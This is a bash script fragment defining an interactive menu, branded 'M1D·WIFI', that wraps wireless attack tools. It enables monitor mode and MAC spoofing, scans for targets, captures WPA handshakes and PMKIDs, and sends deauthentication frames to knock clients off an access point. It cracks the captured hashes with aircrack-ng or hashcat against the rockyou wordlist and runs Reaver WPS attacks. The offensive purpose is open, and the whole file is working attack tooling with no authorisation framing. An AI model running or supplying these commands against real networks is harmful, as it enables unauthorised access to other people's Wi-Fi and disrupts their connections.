_wifitools_menu() {
  BBL='\033[1;34m'; BCY='\033[1;36m'; CY='\033[0;36m'
  W='\033[1;37m';   GR='\033[0;37m';  DGR='\033[2;37m'
  BR='\033[1;31m';  Y='\033[1;33m';   BPU='\033[1;35m'
  G='\033[0;32m';   BG='\033[1;32m';  RESET='\033[0m'

  while true; do
    _m1d_banner
    local ifaces; ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | tr '\n' ' ')
    echo -e "  ${CY}◈ Interfaces:${RESET} ${W}${ifaces:-none detected}${RESET}"
    echo ""
    echo -e "  ${BBL}── INTERFACE ──────────────────────────────────────${RESET}"
    echo -e "  ${BBL}[1]${RESET}  Enable monitor mode"
    echo -e "  ${BBL}[2]${RESET}  Disable monitor mode"
    echo -e "  ${BBL}[3]${RESET}  Change MAC address"
    echo -e "  ${BBL}[4]${RESET}  Restore real MAC"
    echo -e "  ${BBL}[5]${RESET}  Show interface info"
    echo ""
    echo -e "  ${BCY}── RECON ───────────────────────────────────────────${RESET}"
    echo -e "  ${BCY}[6]${RESET}  Scan nearby networks"
    echo -e "  ${BCY}[7]${RESET}  Scan clients on network"
    echo -e "  ${BCY}[8]${RESET}  Passive discovery"
    echo ""
    echo -e "  ${BPU}── CAPTURE ─────────────────────────────────────────${RESET}"
    echo -e "  ${BPU}[9]${RESET}  Capture WPA handshake"
    echo -e "  ${BPU}[10]${RESET} Capture PMKID"
    echo -e "  ${BPU}[11]${RESET} Deauth clients"
    echo ""
    echo -e "  ${Y}── CRACK ───────────────────────────────────────────${RESET}"
    echo -e "  ${Y}[12]${RESET} Crack with aircrack-ng"
    echo -e "  ${Y}[13]${RESET} Crack WPA with hashcat"
    echo -e "  ${Y}[14]${RESET} Crack PMKID with hashcat"
    echo ""
    echo -e "  ${G}── MISC ────────────────────────────────────────────${RESET}"
    echo -e "  ${G}[15]${RESET} WPS attack (reaver)"
    echo -e "  ${G}[16]${RESET} Kill interfering processes"
    echo -e "  ${G}[17]${RESET} Restart NetworkManager"
    echo ""
    echo -e "  ${DGR}[q]  Exit${RESET}"
    echo ""
    echo -ne "  ${BBL}M1D·WIFI ▶${RESET} "; read -r ch; echo ""

    case "$ch" in
      1)  _wt_monitor_on ;;
      2)  _wt_monitor_off ;;
      3)  _wt_mac_change ;;
      4)  _wt_mac_restore ;;
      5)  _wt_iface_info ;;
      6)  _wt_scan_networks ;;
      7)  _wt_scan_clients ;;
      8)  _wt_passive ;;
      9)  _wt_handshake ;;
      10) _wt_pmkid ;;
      11) _wt_deauth ;;
      12) _wt_crack_aircrack ;;
      13) _wt_crack_hashcat_wpa ;;
      14) _wt_crack_hashcat_pmkid ;;
      15) _wt_reaver ;;
      16) _wt_kill_procs ;;
      17) _wt_restart_nm ;;
      q|Q) echo -e "  ${DGR}Exiting.${RESET}\n"; break ;;
      *)   echo -e "  ${BR}[!] Invalid${RESET}\n"; sleep 1 ;;
    esac
  done
}

_wt_monitor_on() {
  echo -ne "  ${BBL}Interface (e.g. wlan0): ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  echo -e "\n  ${CY}[>>] Enabling monitor mode on ${W}$iface${RESET}..."
  sudo ip link set "$iface" down
  sudo iw "$iface" set monitor control
  sudo ip link set "$iface" up
  echo -e "  ${BG}[✔]${RESET} Monitor mode ON — ${W}$iface${RESET}"
  echo -e "  ${DGR}      Alt: sudo airmon-ng start $iface${RESET}\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_monitor_off() {
  echo -ne "  ${BBL}Interface (e.g. wlan0mon): ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  echo -e "\n  ${CY}[>>] Disabling monitor mode on ${W}$iface${RESET}..."
  sudo ip link set "$iface" down
  sudo iw "$iface" set type managed
  sudo ip link set "$iface" up
  echo -e "  ${BG}[✔]${RESET} Managed mode restored — ${W}$iface${RESET}"
  echo -e "  ${DGR}      Alt: sudo airmon-ng stop $iface${RESET}\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_mac_change() {
  echo -ne "  ${BBL}Interface: ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  echo -ne "  ${BBL}New MAC (blank = random): ${RESET}"; read -r mac
  sudo ip link set "$iface" down
  if [ -z "$mac" ]; then
    sudo macchanger -r "$iface"
  else
    sudo macchanger -m "$mac" "$iface"
  fi
  sudo ip link set "$iface" up
  echo -e "\n  ${BG}[✔]${RESET} MAC changed\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_mac_restore() {
  echo -ne "  ${BBL}Interface: ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  sudo ip link set "$iface" down
  sudo macchanger -p "$iface"
  sudo ip link set "$iface" up
  echo -e "\n  ${BG}[✔]${RESET} MAC restored\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_iface_info() {
  echo -e "\n${BBL}  ── INTERFACE DETAILS ───────────────────────${RESET}\n"
  iw dev 2>/dev/null | awk '
    /Interface/ { printf "  \033[1;36m◈ IFACE  :\033[0m \033[1;37m%s\033[0m\n",$2 }
    /type/      { printf "  \033[2;37m  MODE   : %s\033[0m\n",$2 }
    /addr/      { printf "  \033[2;37m  MAC    : %s\033[0m\n",$2 }
    /channel/   { printf "  \033[2;37m  CHAN   : %s\033[0m\n\n",$2 }'
  echo -ne "  Press Enter..."; read -r
}

_wt_scan_networks() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  local out="$HOME/m1d_scan_$(date +%H%M%S)"
  echo -e "\n  ${CY}[>>] Scanning — Ctrl+C to stop${RESET}\n"
  sudo airodump-ng -w "$out" --output-format csv "$iface"
  echo -e "\n  ${BG}[✔]${RESET} Saved: ${W}${out}-01.csv${RESET}\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_scan_clients() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  echo -ne "  ${BBL}Target BSSID     : ${RESET}"; read -r bssid
  echo -ne "  ${BBL}Channel          : ${RESET}"; read -r chan
  [ -z "$iface" ] || [ -z "$bssid" ] || [ -z "$chan" ] && \
    echo -e "  ${BR}All fields required.${RESET}\n" && return
  sudo airodump-ng --bssid "$bssid" -c "$chan" "$iface"
  echo -ne "  Press Enter..."; read -r
}

_wt_passive() {
  echo -ne "  ${BBL}Interface: ${RESET}"; read -r iface
  [ -z "$iface" ] && return
  echo -e "\n  ${CY}[>>] Passive discovery — Ctrl+C to stop${RESET}\n"
  sudo netdiscover -i "$iface" 2>/dev/null \
    || echo -e "  ${Y}Install: sudo apt install netdiscover${RESET}"
  echo -ne "  Press Enter..."; read -r
}

_wt_handshake() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  echo -ne "  ${BBL}BSSID            : ${RESET}"; read -r bssid
  echo -ne "  ${BBL}Channel          : ${RESET}"; read -r chan
  local out="$HOME/m1d_hs_$(date +%H%M%S)"
  [ -z "$iface" ] || [ -z "$bssid" ] || [ -z "$chan" ] && return
  echo -e "\n  ${CY}[>>] Capturing — Ctrl+C when handshake appears${RESET}\n"
  sudo airodump-ng --bssid "$bssid" -c "$chan" \
    -w "$out" --output-format pcap "$iface"
  echo -e "\n  ${BG}[✔]${RESET} Saved: ${W}${out}-01.cap${RESET}\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_pmkid() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  echo -ne "  ${BBL}BSSID (blank=all): ${RESET}"; read -r bssid
  local out="$HOME/m1d_pmkid_$(date +%H%M%S).pcapng"
  local bflag=""
  if [ -n "$bssid" ]; then
    echo "${bssid//:/}" > /tmp/m1d_filter.txt
    bflag="--filterlist_ap=/tmp/m1d_filter.txt --filtermode=2"
  fi
  echo -e "\n  ${CY}[>>] Capturing PMKID — Ctrl+C after 60s${RESET}\n"
  sudo hcxdumptool -i "$iface" $bflag -o "$out" \
    --active_beacon --enable_status=1
  echo -e "\n  ${BG}[✔]${RESET} Saved: ${W}$out${RESET}"
  echo -e "  ${DGR}      Convert: hcxpcapngtool -o hash.hc22000 $out${RESET}\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_deauth() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  echo -ne "  ${BBL}AP BSSID         : ${RESET}"; read -r bssid
  echo -ne "  ${BBL}Client MAC (blank=broadcast): ${RESET}"; read -r client
  echo -ne "  ${BBL}Packets [10]     : ${RESET}"; read -r count
  [ -z "$count" ] && count=10
  [ -z "$iface" ] || [ -z "$bssid" ] && return
  local cflag="-a $bssid"
  [ -n "$client" ] && cflag="$cflag -c $client"
  echo -e "\n  ${CY}[>>] Sending $count deauth frames${RESET}\n"
  sudo aireplay-ng --deauth "$count" $cflag "$iface"
  echo -e "\n  ${BG}[✔]${RESET} Done\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_crack_aircrack() {
  echo -ne "  ${BBL}Cap file   : ${RESET}"; read -r cap
  echo -ne "  ${BBL}Wordlist   : ${RESET}"; read -r wl
  [ -z "$wl" ] && wl="/usr/share/wordlists/rockyou.txt"
  echo -ne "  ${BBL}BSSID (blank=auto): ${RESET}"; read -r bssid
  [ -z "$cap" ] && return
  local bflag=""; [ -n "$bssid" ] && bflag="-b $bssid"
  if [ ! -f "$wl" ]; then
    echo -e "  ${Y}Extract first: sudo gunzip /usr/share/wordlists/rockyou.txt.gz${RESET}\n"
    echo -ne "  Press Enter..."; read -r; return
  fi
  sudo aircrack-ng $bflag -w "$wl" "$cap"
  echo -ne "  Press Enter..."; read -r
}

_wt_crack_hashcat_wpa() {
  echo -ne "  ${BBL}Cap/hash file: ${RESET}"; read -r cap
  echo -ne "  ${BBL}Wordlist     : ${RESET}"; read -r wl
  [ -z "$wl" ] && wl="/usr/share/wordlists/rockyou.txt"
  [ -z "$cap" ] && return
  local hf="$cap"
  if [[ "$cap" == *.cap ]]; then
    hf="${cap%.cap}.hc22000"
    echo -e "  ${CY}[>>] Converting to hc22000...${RESET}"
    hcxpcapngtool -o "$hf" "$cap" 2>/dev/null
  fi
  echo -e "\n  ${CY}[>>] Hashcat running...${RESET}\n"
  hashcat -m 22000 "$hf" "$wl" --force --status --status-timer=5
  echo -ne "  Press Enter..."; read -r
}

_wt_crack_hashcat_pmkid() {
  echo -ne "  ${BBL}Hash file (.hc22000): ${RESET}"; read -r hf
  echo -ne "  ${BBL}Wordlist            : ${RESET}"; read -r wl
  [ -z "$wl" ] && wl="/usr/share/wordlists/rockyou.txt"
  [ -z "$hf" ] && return
  hashcat -m 22000 "$hf" "$wl" --force --status --status-timer=5
  echo -ne "  Press Enter..."; read -r
}

_wt_reaver() {
  echo -ne "  ${BBL}Monitor interface: ${RESET}"; read -r iface
  echo -ne "  ${BBL}BSSID            : ${RESET}"; read -r bssid
  echo -ne "  ${BBL}Channel          : ${RESET}"; read -r chan
  [ -z "$iface" ] || [ -z "$bssid" ] || [ -z "$chan" ] && return
  echo -e "\n  ${CY}[>>] Reaver WPS attack...${RESET}\n"
  sudo reaver -i "$iface" -b "$bssid" -c "$chan" -vv -K 1 2>/dev/null \
    || sudo reaver -i "$iface" -b "$bssid" -c "$chan" -vv
  echo -ne "  Press Enter..."; read -r
}

_wt_kill_procs() {
  echo -e "\n  ${CY}[>>] Killing interfering processes...${RESET}\n"
  sudo airmon-ng check kill 2>/dev/null
  echo -e "  ${BG}[✔]${RESET} Done — run option 17 to restore\n"
  echo -ne "  Press Enter..."; read -r
}

_wt_restart_nm() {
  echo -e "\n  ${CY}[>>] Restarting NetworkManager...${RESET}\n"
  sudo systemctl start NetworkManager
  sudo systemctl start wpa_supplicant 2>/dev/null
  sleep 1
  echo -e "  ${BG}[✔]${RESET} NetworkManager running\n"
  echo -ne "  Press Enter..."; read -r
}

WIFITOOLS_END
